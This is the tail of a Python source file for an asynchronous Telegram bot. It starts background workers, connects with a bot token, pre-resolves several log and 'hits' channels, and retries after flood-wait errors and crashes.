    for _ in range(_BG_WORKERS_COUNT):
        asyncio.create_task(_bg_worker())

    while True:
        try:
            log_system("BOOT", "Starting bot client...")
            await client.start(bot_token=BOT_TOKEN)
            # Warm channel/group peers so styled_send does not miss access hashes
            for _cid in (LOGS_CHANNEL_ID, HITS_CHANNEL_ID, JOIN_GROUP_ID, HIT_CHANNEL_ID, LOG_CHANNEL_ID):
                try:
                    await _resolve_send_peer(_cid)
                except Exception:
                    pass
            log_system("BOOT", "✓ Bot Started!")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            log_system("FLOOD", f"Sleeping={e.seconds + 5}s", "warning")
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            log_system("CRASH", f"{e}", "error")
            await asyncio.sleep(10)


if __name__ == "__main__":
    try:
        import uvloop
        uvloop.install()
    except ImportError:
        pass
    asyncio.run(main())
